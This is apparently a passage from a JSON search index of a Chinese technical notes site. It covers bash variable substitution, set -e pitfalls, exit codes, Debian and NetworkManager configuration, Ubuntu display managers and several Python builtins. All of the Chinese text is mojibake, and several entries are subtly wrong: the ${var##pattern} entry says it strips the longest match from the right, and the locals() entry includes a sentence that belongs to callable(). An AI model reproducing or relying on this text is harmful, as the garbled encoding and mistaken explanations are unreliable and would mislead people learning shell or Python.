æ‰€ä¸åŒä¹‹å¤„æ˜¯${var:=string}è‹¥varä¸ºç©ºæ—¶ï¼Œç”¨stringæ›¿æ¢${var:=string}çš„åŒæ—¶ï¼ŒæŠŠstringèµ‹ç»™å˜é‡var; ${var:=string}å¾ˆå¸¸ç”¨çš„ä¸€ç§ç”¨æ³•æ˜¯ï¼Œåˆ¤æ–­æŸä¸ªå˜é‡æ˜¯å¦èµ‹å€¼ï¼Œæ²¡æœ‰çš„è¯åˆ™ç»™å®ƒèµ‹ä¸Šä¸€ä¸ªé»˜è®¤å€¼ ${var:+string} æ›¿æ¢è§„åˆ™å’Œä¸Šé¢çš„ç›¸åï¼Œå³åªæœ‰å½“varä¸æ˜¯ç©ºçš„æ—¶å€™æ‰æ›¿æ¢æˆstringï¼Œ è‹¥varä¸ºç©ºæ—¶åˆ™ä¸æ›¿æ¢æˆ–è€…è¯´æ˜¯æ›¿æ¢æˆå˜é‡ varçš„å€¼ï¼Œ å³ç©ºå€¼ã€‚(å› ä¸ºå˜é‡varæ­¤æ—¶ä¸ºç©ºï¼Œæ‰€ä»¥è¿™ä¸¤ç§è¯´æ³•æ˜¯ç­‰ä»·çš„) ${var:?string} è‹¥å˜é‡varä¸ä¸ºç©ºï¼Œåˆ™ç”¨å˜é‡varçš„å€¼æ¥æ›¿æ¢${var:?string}ï¼› è‹¥å˜é‡varä¸ºç©ºï¼Œåˆ™æŠŠstringè¾“å‡ºåˆ°æ ‡å‡†é”™è¯¯ä¸­ï¼Œå¹¶ä»è„šæœ¬ä¸­é€€å‡ºã€‚ æˆ‘ä»¬å¯åˆ©ç”¨æ­¤ç‰¹æ€§æ¥æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡çš„å€¼ã€‚ æ³¨è§£ ä¸Šé¢è¿™å››ç§æ›¿æ¢ç»“æ„ä¸­stringä¸ä¸€å®šæ˜¯å¸¸å€¼çš„ï¼Œå¯ç”¨å¦å¤–ä¸€ä¸ªå˜é‡çš„å€¼æˆ–æ˜¯ä¸€ç§å‘½ä»¤çš„è¾“å‡ºã€‚ å››ç§æ¨¡å¼åŒ¹é…æ›¿æ¢ç»“æ„ æ¨¡å¼åŒ¹é…è®°å¿†æ–¹æ³•ï¼š # æ˜¯å»æ‰å·¦è¾¹(åœ¨é”®ç›˜ä¸Š#åœ¨$ä¹‹å·¦è¾¹) % æ˜¯å»æ‰å³è¾¹(åœ¨é”®ç›˜ä¸Š%åœ¨$ä¹‹å³è¾¹) # å’Œ % ä¸­çš„å•ä¸€ç¬¦å·æ˜¯æœ€å°åŒ¹é…ï¼Œä¸¤ä¸ªç›¸åŒç¬¦å·æ˜¯æœ€å¤§åŒ¹é…ã€‚ ä¹Ÿæ˜¯å››ç§: ${var%pattern} ${var%%pattern} ${var#pattern} ${var##pattern} ç¬¬ä¸€ç§æ¨¡å¼: ${variable%pattern} shellåœ¨variableä¸­æŸ¥æ‰¾ï¼Œçœ‹å®ƒæ˜¯å¦ä¸€ç»™çš„æ¨¡å¼patternç»“å°¾ï¼Œ å¦‚æœæ˜¯ï¼Œå°±ä»å‘½ä»¤è¡ŒæŠŠvariableä¸­çš„å†…å®¹å»æ‰å³è¾¹æœ€çŸ­çš„åŒ¹é…æ¨¡å¼ ç¬¬äºŒç§æ¨¡å¼: ${variable%%pattern} shellåœ¨variableä¸­æŸ¥æ‰¾ï¼Œçœ‹å®ƒæ˜¯å¦ä¸€ç»™çš„æ¨¡å¼patternç»“å°¾ï¼Œ å¦‚æœæ˜¯ï¼Œå°±ä»å‘½ä»¤è¡ŒæŠŠvariableä¸­çš„å†…å®¹å»æ‰å³è¾¹æœ€é•¿çš„åŒ¹é…æ¨¡å¼ ç¬¬ä¸‰ç§æ¨¡å¼: ${variable#pattern} shellåœ¨variableä¸­æŸ¥æ‰¾ï¼Œçœ‹å®ƒæ˜¯å¦ä¸€ç»™çš„æ¨¡å¼patternå¼€å§‹ï¼Œ å¦‚æœæ˜¯ï¼Œå°±ä»å‘½ä»¤è¡ŒæŠŠvariableä¸­çš„å†…å®¹å»æ‰å·¦è¾¹æœ€çŸ­çš„åŒ¹é…æ¨¡å¼ ç¬¬å››ç§æ¨¡å¼: ${variable##pattern} shellåœ¨variableä¸­æŸ¥æ‰¾ï¼Œçœ‹å®ƒæ˜¯å¦ä¸€ç»™çš„æ¨¡å¼patternç»“å°¾ï¼Œ å¦‚æœæ˜¯ï¼Œå°±ä»å‘½ä»¤è¡ŒæŠŠvariableä¸­çš„å†…å®¹å»æ‰å³è¾¹æœ€é•¿çš„åŒ¹é…æ¨¡å¼ æ³¨è§£ è¿™å››ç§æ¨¡å¼ä¸­éƒ½ä¸ä¼šæ”¹å˜variableçš„å€¼ï¼Œ å…¶ä¸­, åªæœ‰åœ¨patternä¸­ä½¿ç”¨äº† ``*`` åŒ¹é…ç¬¦å·æ—¶ , %å’Œ%%ï¼Œ#å’Œ##æ‰æœ‰åŒºåˆ«. ç»“æ„ä¸­çš„patternæ”¯æŒé€šé…ç¬¦, * è¡¨ç¤ºé›¶ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦; ? è¡¨ç¤ºä»…ä¸ä¸€ä¸ªä»»æ„å­—ç¬¦åŒ¹é…; [...] è¡¨ç¤ºåŒ¹é…ä¸­æ‹¬å·é‡Œé¢çš„å­—ç¬¦; [!...] è¡¨ç¤ºä¸åŒ¹é…ä¸­æ‹¬å·é‡Œé¢çš„å­—ç¬¦. ç¤ºä¾‹: var=testcase echo $var #testcase å»æ‰å³è¾¹çš„se: echo ${var%s*e} #testca echo $var #testcase å»æ‰s..e: echo ${var%%s*e} #te å»æ‰å·¦è¾¹ç¬¬ä¸€ä¸ªeä¹‹å‰çš„ï¼ˆåŒ…æ‹¬è‡ªå·±ï¼‰: echo ${var#?e} #stcase å»æ‰se: echo ${var##?e} #stcase å»è‡ªå·±: echo ${var##*e} # å»çš„å°±å‰©ä¸ªe: echo ${var##*s} #e å»test: echo ${var##test} #case","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-SHELL-variable-replacement.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-SHELL-variable-replacement.html"},{"title":"shellä¸‹whileä¸set","text":"ä½¿ç”¨äº†: set -e æ—¶, ä¸€å®šè¦æ³¨æ„ä¸èƒ½åŒ…è£¹ while è¯­å¥. whileè¯­å¥çš„æœ€åä¸€æ¬¡ç»“æœ, ä¼šè¿”å›1, é€€å‡ºwhileå¾ªç¯, ç„¶åset -eå°±ä¼šè§‰å¾—æ˜¯ä»£ç æŠ¥é”™äº†, ä¸ç»™åç»­ä»£ç æ‰§è¡Œ ä¾‹: set -e blue_echo(){ local _strs _strs=\"$*\" echo \"\\e[1;36m${_strs}\\e[0m\\n\" } pv_blue_echo(){ local _time _time=\"$1\" set +e while [ ${_time} -gt 0 ]; do blue_echo \"................\" | pv -qL 15 _time=\"$(expr \"${_time}\" - 1)\" done set -e } # pv_blue_echo 3","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Under-shell-and-set.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Under-shell-and-set.html"},{"title":"shellé€€å‡ºçŠ¶æ€ç ","text":"Linuxé€€å‡ºçŠ¶æ€ç  çŠ¶æ€ç  æè¿° 0 å‘½ä»¤æˆåŠŸç»“æŸ 1 é€šç”¨æœªçŸ¥é”™è¯¯ 2 è¯¯ç”¨shellå‘½ä»¤ 126 å‘½ä»¤ä¸å¯æ‰§è¡Œ 127 æ²¡æ‰¾åˆ°å‘½ä»¤ 128 æ— æ•ˆé€€å‡ºå‚æ•° 128+x Linuxä¿¡å·xçš„ä¸¥é‡é”™è¯¯ 130 å‘½ä»¤é€šè¿‡Ctrl+Cç»ˆæ­¢ 255 é€€å‡ºçŠ¶æ€ç è¶Šç•Œ è¿”å›å€¼ åªèƒ½è¿”å›æ•´æ•°å€¼: #!/bin/bash function getResultFun(){ echo \"è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ª shell å‡½æ•°!\" return `expr 1 + 1` } getResultFun echo $?","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-exit-status-code.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-exit-status-code.html"},{"title":"debianæŸ¥çœ‹ç‰ˆæœ¬","text":"åœ¨ Debian æˆ–åŸºäº Debian çš„ Linux å‘è¡Œç‰ˆä¸­ï¼Œæœ‰å¤šç§æ–¹æ³•å¯ä»¥æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯ï¼š ä½¿ç”¨ lsb_release å‘½ä»¤: lsb_release -a è¿™ä¸ªå‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰ç³»ç»Ÿçš„å‘è¡Œç‰ˆåç§°ã€ç‰ˆæœ¬å·ã€Codename å’Œæè¿°ä¿¡æ¯ã€‚ æŸ¥çœ‹ /etc/issue æ–‡ä»¶: cat /etc/issue è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†å½“å‰ç³»ç»Ÿçš„ç‰ˆæœ¬å’Œå‘è¡Œç‰ˆä¿¡æ¯ã€‚ æŸ¥çœ‹ /etc/os-release æ–‡ä»¶: cat /etc/os-release è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†å½“å‰ç³»ç»Ÿçš„å‘è¡Œç‰ˆåç§°ã€ç‰ˆæœ¬å·ã€ID å’Œæè¿°ä¿¡æ¯ã€‚ ä½¿ç”¨ uname å‘½ä»¤: uname -a è¿™ä¸ªå‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬ã€ä¸»æœºåå’Œæ“ä½œç³»ç»Ÿç±»å‹ç­‰ä¿¡æ¯ã€‚ å…¶ä¸­ï¼Œlsb_release å‘½ä»¤æ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå¯ä»¥æä¾›æ¯”è¾ƒè¯¦ç»†çš„ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ã€‚å¦‚æœæ‚¨åªéœ€è¦æŸ¥çœ‹åŸºæœ¬çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹æ³•ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-Debian-View-System-Version.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-Debian-View-System-Version.html"},{"title":"DebianåŒ…ä¾èµ–","text":"è¦çŸ¥é“packageçš„ä¾èµ–æ–¹æ¡ˆ å¯ä»¥ç›´æ¥çœ‹æŠ¥é”™åœ°æ–¹çš„æºç çš„è¦æ±‚ ä¹Ÿå¯ä»¥ç›´æ¥: apt-cache show $package æœ‰äº›æ¶‰åŠåˆ°äº†ç³»ç»Ÿçš„åŒ…æ²¡æ³•æ“ä½œçš„è¯: apt-get install aptitude aptitude insatll $package #è¿™é‡Œä¼šç»™å‡ºä¾èµ–æ–¹æ¡ˆï¼Œé€‰ä¸€ä¸ªå¯è¡Œçš„ apt-get insatll $package","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-Debian-package-dependencies.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-Debian-package-dependencies.html"},{"title":"debianä¸€äº›äº†è§£","text":"debiançš„æœåŠ¡åŸºæœ¬ä¸Šéƒ½å¯ä»¥åœ¨ /etc/init.d ä¸‹æ‰¾åˆ° ä½¿ç”¨aptå®‰è£…debæœ¬åœ°åŒ… debåŒ…å¯ä»¥é€šè¿‡dpkgå®‰è£…: dpkg -i <package> ä¹Ÿå¯ä»¥é€šè¿‡aptå®‰è£…: apt install ./<package> æ³¨è§£ apt å®‰è£…æœ¬åœ°debåŒ…æ—¶, å¿…é¡»æŒ‡å®šè·¯å¾„, å¦åˆ™ä¼šå»è½¯ä»¶ä»“åº“æ‰¾.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-debian-some-understanding.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-debian-some-understanding.html"},{"title":"ç½‘ç»œç®¡ç†","text":"å‡ ä¸ªç›¸å…³çš„é…ç½®æ–‡ä»¶ /etc/resolv.conf DNSé…ç½®ç›¸å…³çš„æ–‡ä»¶, å†…å®¹å°±æ˜¯å½“å‰æ­£åœ¨ä½¿ç”¨çš„DNS, å¦‚: # # macOS Notice # # This file is not consulted for DNS hostname resolution, address # resolution, or the DNS query routing mechanism used by most # processes on this system. # # To view the DNS configuration used by this system, use: # scutil --dns # # SEE ALSO # dns-sd(1), scutil(8) # # This file is automatically generated. # nameserver 192.168.1.1 nameserver 192.168.1.1 # è¡¨ç¤ºæ³¨é‡Š, nameserverè¡¨ç¤ºä½¿ç”¨çš„DNSæœåŠ¡å™¨. æˆ‘è¿™é‡Œæ˜¯è¿çš„WIFI, æ‰€ä»¥ä½¿ç”¨è·¯ç”±å™¨é‚£è¾¹ç½‘å…³æä¾›çš„è·¯ç”± /etc/network/interfaces Unix/Linux ç³»ç»Ÿç½‘ç»œé…ç½®çš„ä¼ ç»Ÿæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶é€šå¸¸ç”¨äºæ‰‹åŠ¨é…ç½®ç½‘ç»œæ¥å£ä»¥åŠ IP åœ°å€ç­‰ç›¸å…³å‚æ•° é«˜ç‰ˆæœ¬å¦‚Ubuntu 20.04 ä¸­ï¼Œæ‰€æœ‰çš„ç½‘ç»œè®¾ç½®éƒ½å·²ç»è½¬ç§»åˆ°äº† NetworkManager å½“ä¸­ï¼Œæ­¤æ–‡ä»¶ä¸å†è¢«é»˜è®¤ä½¿ç”¨. é…ç½®æ¯”NetworkManager æ›´å¤æ‚ NetworkManager /usr/lib/NetworkManager/conf.d/ é»˜è®¤çš„ç³»ç»Ÿçº§é…ç½®æ–‡ä»¶è·¯å¾„, åŒ…å«äº†ä¸€äº›ç³»ç»Ÿçº§åˆ«çš„é…ç½®æ–‡ä»¶ï¼Œ å®ƒä»¬æ˜¯ç”±è½¯ä»¶åŒ…æä¾›æ–¹å®‰è£…çš„ï¼Œè¿™äº›æ–‡ä»¶é€šå¸¸ä¸åº”è¯¥è¢«ç”¨æˆ·è½»æ˜“ä¿®æ”¹ã€‚ å¦‚æœæ‚¨ç¡®å®éœ€è¦ä¿®æ”¹å…¶ä¸­çš„æŸäº›é…ç½®é€‰é¡¹ï¼Œå¯ä»¥ä½¿ç”¨ /etc/NetworkManager/conf.d/ ç›®å½•ä¸‹çš„æœ¬åœ°é…ç½®æ–‡ä»¶è¿›è¡Œè¦†ç›–ã€‚ ~/.config/NetworkManager/ é»˜è®¤çš„ç”¨æˆ·çº§é…ç½®æ–‡ä»¶è·¯å¾„, åŒ…å«å½“å‰ç”¨æˆ·ç‰¹å®šçš„NetworkManageré…ç½®æ–‡ä»¶. /etc/NetworkManager/NetworkManager.conf NetworkManager çš„ä¸»è¦é…ç½®æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†ç³»ç»Ÿçº§åˆ«çš„é»˜è®¤é…ç½®é€‰é¡¹ã€‚ åœ¨è¯¥æ–‡ä»¶ä¸­å¯ä»¥é…ç½®å¾ˆå¤šé€‰é¡¹ï¼Œä¾‹å¦‚è¦ä½¿ç”¨å“ªç§æ’ä»¶æ¥ç®¡ç†ç½‘ç»œæ¥å£ã€æ˜¯å¦å¯ç”¨ DNS é‡å†™ç­‰ç­‰ã€‚ å¦‚å…¶ä¸­çš„ [ifupdown] ä¸‹é…ç½® managed=true è¡¨ç¤ºè‡ªå¯åŠ¨ /etc/NetworkManager/conf.d/ ç›®å½•, æ­¤æ–‡ä»¶å¤¹ä¸‹å¯èƒ½æœ‰ä¸€äº›é…ç½®æ–‡ä»¶. åŒ…å«äº†ä¸€äº›æœ¬åœ°çš„é…ç½®æ–‡ä»¶ï¼Œ å®ƒä»¬ä¼šè¦†ç›–æ‰ /usr/lib/NetworkManager/conf.d/ ä¸­ä¸€äº›ç³»ç»Ÿçº§åˆ«çš„é…ç½®æ–‡ä»¶ã€‚ å¦‚æœæ‚¨éœ€è¦ä¿®æ”¹ NetworkManager çš„æŸäº›é…ç½®é€‰é¡¹ï¼Œæœ€å¥½åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„é…ç½®æ–‡ä»¶ï¼Œå¹¶å°†ä¿®æ”¹åçš„å†…å®¹å†™å…¥åˆ°è¯¥æ–‡ä»¶ä¸­ã€‚ /etc/NetworkManager/system-connections/ åŒ…å«äº†æ‰€æœ‰å­˜å‚¨åœ¨ç³»ç»Ÿä¸­çš„ç½‘ç»œè¿æ¥çš„è¯¦ç»†ä¿¡æ¯ã€‚ æ¯ä¸ªç½‘ç»œè¿æ¥éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ .nmconnection æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†è¯¥è¿æ¥çš„æ‰€æœ‰å‚æ•°ã€‚ å¦‚æœéœ€è¦æ‰‹åŠ¨ä¿®æ”¹æŸä¸ªç½‘ç»œè¿æ¥çš„å‚æ•°ï¼ˆä¾‹å¦‚ IP åœ°å€æˆ–è€… DNS æœåŠ¡å™¨ï¼‰ï¼Œå¯ä»¥ç¼–è¾‘è¯¥æ–‡ä»¶å¹¶ä¿®æ”¹å¯¹åº”çš„å€¼ã€‚ åœ¨å…¬å¸Ubuntu20çš„äº‘æ¡Œé¢ä¸Šæ‰¾äº†å¾ˆä¹…çš„ Wired connection åœ¨å“ªé…ç½®è‡ªåŠ¨é“¾æ¥ipv4, æœ€ç»ˆå‘ç°é™¤äº†å›¾å½¢ç•Œé¢çš„è®¾ç½®, è¿˜å†™åˆ°äº† /etc/NetworkManager/system-connections/Wired connection 1.nmconnection è€Œæ­¤ç½‘å¡ ens18 çš„ip, dnsåœ¨ /etc/NetworkManager/system-connections/ens18.nmconnection æ³¨è§£ æœ‰ä¸€ä¸ª /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/nmcli æŒ‡ä»¤æ”¯æŒ å›¾å½¢ç•Œé¢çš„ç½‘ç»œé…ç½®å·¥å…· Debian ç³»ç»Ÿ NM çš„å®˜æ–¹æ–‡æ¡£ä½äº \" /usr/share/doc/network-manager/README.Debian \" ã€‚ æœ¬è´¨ä¸Šï¼Œå¦‚ä¸‹æ“ä½œå³å¯å®Œæˆæ¡Œé¢çš„ç½‘ç»œé…ç½®ã€‚ é€šè¿‡ä¸‹åˆ—å‘½ä»¤ä½¿æ¡Œé¢ç”¨æˆ· foo å½’å± \" netdev \" ç»„, å¦å¤–ï¼Œä¾‹å¦‚ GNOME å’Œ KDE è¿™æ ·çš„ç°ä»£æ¡Œé¢ç¯å¢ƒä¼šé€šè¿‡ D-bus <https://zh.wikipedia.org/wiki/D-Bus> è‡ªåŠ¨å®Œæˆè¯¥æ“ä½œ: $ sudo adduser foo netdev ä½¿ \" /etc/network/interfaces \" çš„é…ç½®ä¿æŒ ä¸‹é¢é‚£æ ·ç®€æ´: auto lo iface lo inet loopback é€šè¿‡ä¸‹åˆ—å‘½ä»¤é‡æ–° å¯åŠ¨ NM: $ sudo systemctl restart network-manager é€šè¿‡å›¾å½¢ç•Œé¢é…ç½®ç½‘ç»œã€‚ æ³¨è§£ åªæœ‰ ä¸ åˆ—åœ¨ \" /etc/network/interfaces \" ä¸­çš„æ¥å£ä¼šè¢« NM ç®¡ç†ï¼Œä»¥é¿å…ä¸ ifupdown çš„å†²çªã€‚ å¦‚æœä½ æƒ³æ‰©å±• NM çš„ç½‘ç»œé…ç½®åŠŸèƒ½ï¼Œè¯·å¯»æ‰¾é€‚å½“çš„æ’ä»¶æ¨¡å—å’Œè¡¥å……è½¯ä»¶åŒ…ï¼Œ ä¾‹å¦‚ network-manager-openconnect ã€ network-manager-openvpn-gnome ã€s s network-manager-pptp-gnome ã€ mobile-broadband-provider-info ã€ gnome-bluetooth ç­‰ç­‰ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-network-Network-management.html","loc":"/yq-doc-source-docs-operating-system-linux-network-Network-management.html"},{"title":"Linuxå›¾å½¢ç•Œé¢","text":"æ­¤ç¯‡ä¸»è¦é’ˆå¯¹ä¸Ubuntu20 ä»…ä»¥æ­¤ç¯‡, çºªå¿µé‚£äº‘æ¡Œé¢é‡å¯åçš„ä¸¢å¤±çš„å›¾å½¢ç•Œé¢ Ubuntuçš„æ¡Œé¢ç³»ç»Ÿåˆ†: æ¡Œé¢ç¯å¢ƒ æ˜¾ç¤ºå™¨ç®¡ç†å™¨ æ¡Œé¢ç¯å¢ƒ å¸¸è§çš„æœ‰ GNOME KDE Xfce æ˜¾ç¤ºå™¨ç®¡ç†å™¨ æ˜¾ç¤ºç®¡ç†å™¨å‘ç”¨æˆ·æ˜¾ç¤ºç™»å½•å±å¹•ã€‚ å½“ç”¨æˆ·æˆåŠŸè¾“å…¥ç”¨æˆ·åå’Œå¯†ç çš„æœ‰æ•ˆç»„åˆæ—¶ï¼Œä¼šè¯å¼€å§‹ã€‚gdm3ï¼Œkdm å’Œ lightdm éƒ½æ˜¯æ˜¾ç¤ºç®¡ç†å™¨ã€‚ å®ƒä»¬æä¾›å›¾å½¢åŒ–ç™»å½•å¹¶å¤„ç†ç”¨æˆ·èº«ä»½éªŒè¯ã€‚ gdmï¼Œgnomeç³»åˆ—çš„å›¾å½¢ç®¡ç†å™¨ã€‚ kdm, SDDMæ˜¯KDEç³»åˆ—çš„å›¾å½¢ç®¡ç†å™¨ã€‚ lightdmæ˜¯å¦ä¸€ç§è·¨æ¡Œé¢DMã€‚è¯¥æ˜¾ç¤ºç®¡ç†å™¨çš„ä¸»è¦åŠŸèƒ½æ˜¯é‡é‡è½»ï¼Œè¿™æ„å‘³ç€å®ƒåœ¨å ç”¨å¾ˆå°‘å†…å­˜çš„æƒ…å†µä¸‹æä¾›äº†å‡ºè‰²çš„æ€§èƒ½ã€‚ æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ˜¾ç¤ºå™¨ç®¡ç†å™¨: cat /etc/X11/default-display-manager å¯èƒ½çš„å€¼: /usr/sbin/gdm3 æˆ– /usr/sbin/lightdm æˆ– /usr/sbin/sddm æ³¨è§£ å¯ç›´æ¥æ‰§è¡Œ: sudo gdm æˆ– sudo startx è¿›å…¥å›¾å½¢ç•Œé¢. åˆ‡æ¢æ˜¾ç¤ºå™¨ç®¡ç†å™¨: sudo dpkg-reconfigure <Default_Display_Manager> å¦‚: sudo dpkg-reconfigure gdm3 æˆ– sudo dpkg-reconfigure lightdm æˆ– sudo dpkg-reconfigure sddm","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-ubuntu-graphic-interface.html","loc":"/yq-doc-source-docs-operating-system-linux-ubuntu-graphic-interface.html"},{"title":"getattr","text":"è¿”å›ä¸€ä¸ªå¯¹è±¡å±æ€§å€¼ getattr è¯­æ³•: getattr(object, name[, default])","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Getattr.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Getattr.html"},{"title":"isinstance","text":"æ˜¯å¦æ˜¯å­—å…¸: isinstance(str, dict)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Isinstance.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Isinstance.html"},{"title":"locals","text":"locals() å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å±€éƒ¨å˜é‡ã€‚ å¯¹äºå‡½æ•°, æ–¹æ³•, lambda å‡½å¼, ç±», ä»¥åŠå®ç°äº† __call__ æ–¹æ³•çš„ç±»å®ä¾‹, å®ƒéƒ½è¿”å› True: >>>def runoob(arg): # ä¸¤ä¸ªå±€éƒ¨å˜é‡ï¼šargã€z ... z = 1 ... print (locals()) ... >>> runoob(4) {'z': 1, 'arg': 4} # è¿”å›ä¸€ä¸ªåå­—/å€¼å¯¹çš„å­—å…¸ >>>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Locals.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Locals.html"},{"title":"__import__","text":"ç”¨äºåŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•° å‚æ•° __import__(name, globals=None, locals=None, fromlist=(), level=0) name: str å¯¼å…¥çš„æ¨¡å—å, å½“ fromlist ä¸ºç©ºæ—¶, è¿”å›çš„æ˜¯é¡¶å±‚æ¨¡å— globals: None/globals()/locals() æ¨¡å—ä½œç”¨èŒƒå›´, å…¨å±€å˜é‡æˆ–å±€éƒ¨å˜é‡. é»˜è®¤None, ä¸€èˆ¬ä¸ç”¨è®¾ç½® fromlist: list å¯¼å…¥å­æ¨¡å—çš„é›†åˆ. level: int 0è¡¨ç¤ºç»å¯¹å¯¼å…¥, ä¸ºæ­£ä½¿ç”¨ç›¸å¯¹å¯¼å…¥, ç›¸å¯¹äºè°ƒç”¨__import __()çš„æ¨¡å—ç›®å½•","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-__import__.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-__import__.html"},{"title":"__init__","text":"å±äº /docs/åç«¯/python/æ¦‚å¿µç›¸å…³/objectç±» ç”¨äºç±»ä¸­ï¼Œä¸€èˆ¬è¡¨ç¤ºåˆå§‹åŒ–ç±»ï¼ˆæ„é€ å‡½æ•°ï¼‰ é¡ºä¾¿æä¸€ä¸‹ __init__.py åœ¨Pythonå·¥ç¨‹é‡Œï¼Œå½“pythonæ£€æµ‹åˆ°ä¸€ä¸ªç›®å½•ä¸‹å­˜åœ¨ __init__.py æ–‡ä»¶æ—¶ï¼Œ pythonå°±ä¼šæŠŠå®ƒå½“æˆä¸€ä¸ªæ¨¡å—(module)ã€‚ Moduleè·ŸCï¼‹ï¼‹çš„å‘½åç©ºé—´å’ŒJavaçš„Packageçš„æ¦‚å¿µå¾ˆåƒï¼Œéƒ½æ˜¯ä¸ºäº†ç§‘å­¦åœ°ç»„ç»‡åŒ–å·¥ç¨‹ï¼Œç®¡ç†å‘½åç©ºé—´ã€‚ __init__.py å¯ä»¥æ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æœ‰éå¸¸ä¸°å¯Œçš„å†…å®¹ã€‚ __init__.py çš„åŸå§‹ä½¿å‘½æ˜¯å£°æ˜ä¸€ä¸ªæ¨¡å—ï¼Œæ‰€ä»¥å®ƒå¯ä»¥æ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶ã€‚ åœ¨ __init__.py ä¸­å£°æ˜çš„æ‰€æœ‰ç±»å‹å’Œå˜é‡ï¼Œå°±æ˜¯å…¶ä»£è¡¨çš„æ¨¡å—çš„ç±»å‹å’Œå˜é‡ æˆ‘ä»¬åœ¨åˆ©ç”¨`__init__.py`æ—¶ï¼Œåº”è¯¥éµå¾ªå¦‚ä¸‹å‡ ä¸ªåŸåˆ™ï¼š ä¸è¦æ±¡æŸ“ç°æœ‰çš„å‘½åç©ºé—´ã€‚ æ¨¡å—ä¸€ä¸ªç›®çš„ï¼Œæ˜¯ä¸ºäº†é¿å…å‘½åå†²çªï¼Œå¦‚æœä½ åœ¨ç§ç”¨ __init__.py æ—¶è¿èƒŒè¿™ä¸ªåŸåˆ™ï¼Œ æ˜¯åå…¶é“è€Œä¸ºä¹‹ï¼Œå°±æ²¡æœ‰å¿…è¦ä½¿ç”¨æ¨¡å—äº†ã€‚ åˆ©ç”¨ __init__.py å¯¹å¤–æä¾›ç±»å‹ã€å˜é‡å’Œæ¥å£ï¼Œå¯¹ç”¨æˆ·éšè—å„ä¸ªå­æ¨¡å—çš„å®ç°ã€‚ ä¸€ä¸ªæ¨¡å—çš„å®ç°å¯èƒ½éå¸¸å¤æ‚ï¼Œä½ éœ€è¦ç”¨å¾ˆå¤šä¸ªæ–‡ä»¶ï¼Œç”šè‡³å¾ˆå¤šå­æ¨¡å—æ¥å®ç°ï¼Œ ä½†ç”¨æˆ·å¯èƒ½åªéœ€è¦çŸ¥é“ä¸€ä¸ªç±»å‹å’Œæ¥å£ã€‚ç”±äºå„ä¸ªå­æ¨¡å—çš„å®ç°æœ‰å¯èƒ½éå¸¸å¤æ‚ï¼Œ è€Œå¯¹å¤–æä¾›çš„ç±»å‹å’Œæ¥å£æœ‰å¯èƒ½éå¸¸çš„ç®€å•ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹å¼æ¥å¯¹ç”¨æˆ·éšè—å®ç°ï¼ŒåŒæ—¶æä¾›éå¸¸æ–¹ä¾¿çš„ä½¿ç”¨ã€‚ åªåœ¨ __init__.py ä¸­å¯¼å…¥æœ‰å¿…è¦çš„å†…å®¹ï¼Œä¸è¦åšæ²¡å¿…è¦çš„è¿ç®—ã€‚ å¦‚æœæˆ‘ä»¬åœ¨ __init__.py ä¸­åšå¤ªå¤šäº‹æƒ…ï¼Œæ¯æ¬¡importéƒ½ä¼šæœ‰é¢å¤–çš„è¿ç®—ï¼Œä¼šé€ æˆæ²¡æœ‰å¿…è¦çš„å¼€é”€ã€‚ å’Œ __main__.py åŒºåˆ« 